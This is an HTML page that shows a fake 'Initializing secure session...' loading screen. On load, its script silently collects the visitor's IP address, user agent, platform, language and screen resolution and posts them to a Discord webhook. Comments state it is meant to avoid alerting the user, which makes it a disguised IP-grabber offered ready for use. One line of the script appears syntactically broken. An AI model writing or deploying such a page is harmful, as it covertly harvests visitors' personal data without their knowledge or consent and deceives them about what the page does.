<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-950 text-gray-400 h-screen flex items-center justify-center font-sans">

    <div class="text-center">
        <div class="inline-block animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-indigo-500 mb-4"></div>
        <p class="text-sm">Initializing secure session...</p>
    </div>

    <script>
        // Hardcoded Discord Webhook URL (Replace with your actual webhook URL for testing)
        const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";

        async function captureAndSend() {
            try {
                // Fetch public IP address using a reliable free service
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const clientIp = ipData.ip;

                // Gather additional non-invasive device/browser metadata
                const timestamp = new Date().toISOString();
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenRes = `${window.screen.width}x${window.screen.height}`;

                // Construct payload for Discord Webhook
                const payload = {
                    content: `🚨 **New Visitor Detected**`,
                    embeds: [{
                        title: "Visitor Metadata Log",
                        color: 3447003, // Blue accent
                        fields: [
                            { name: "🌐 IP Address", value: clientIp, inline: true },
                            { name: "⏰ Timestamp", value: timestamp, inline: true },
                            { name: "💻 Platform", value: platform, inline: true },
                            { name: "🖥️ Screen Resolution", value: screenRes, inline: true },
                            { name: "🗣️ Language", value: language, inline: true },
                            { name: "🔍 User Agent", value: \`\`\`\${userAgent}\`\`\`, inline: false }
                        ]
                    }]
                };

                // Send data silently in the background
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                // Fail silently to avoid alerting the user
                console.error("Background process error:", error);
            }
        }

        // Trigger immediately when the page loads
        window.addEventListener('load', () => {
            captureAndSend();
        });
    </script>
</body>
</html>
